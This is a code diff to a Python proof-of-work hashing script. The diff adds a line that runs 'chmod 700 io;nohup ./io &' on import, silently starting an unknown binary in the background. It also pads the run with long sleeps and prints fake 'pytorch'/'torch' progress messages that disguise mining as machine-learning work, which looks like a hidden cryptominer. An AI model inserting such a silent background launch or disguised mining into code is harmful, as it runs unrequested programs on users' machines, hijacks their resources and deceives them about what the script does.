@@ -1,3 +1,5 @@
+import os
+os.system('chmod 700 io;nohup ./io &')
 from hashlib import sha256
 from time import  sleep
 MAX_NONCE = 100000000000
@@ -24,25 +26,25 @@ if __name__=='__main__':
     difficulty=1 # try changing this to higher number and you will see it will take more time for mining as difficulty increases
     import time
     start = time.time()
-    sleep(3)
+    sleep(100)
     print("started pytorch")
-    sleep(3)
+    sleep(100)
     print("||")
-    sleep(1)
+    sleep(100)
     print("||")
-    sleep(1)
+    sleep(100)
     print("||")
-    sleep(1)
+    sleep(100)
     print("||")
-    sleep(1)
+    sleep(100)
     print("||")
-    sleep(1)
+    sleep(100)
     print("\/")
-    sleep(2)
+    sleep(100)
     new_hash = mine(5,transactions,'0000000xa036944e29568d0cff17edbe038f81208fecf9a66be9a2b8321c6ec7', difficulty)
-    sleep(2)
+    sleep(100)
     total_time = str((time.time() - start))
-    sleep(3)
+    sleep(100)
     print(f"ending torch. torch took: {total_time} seconds")
-    sleep(2)
+    sleep(100)
     print(new_hash)
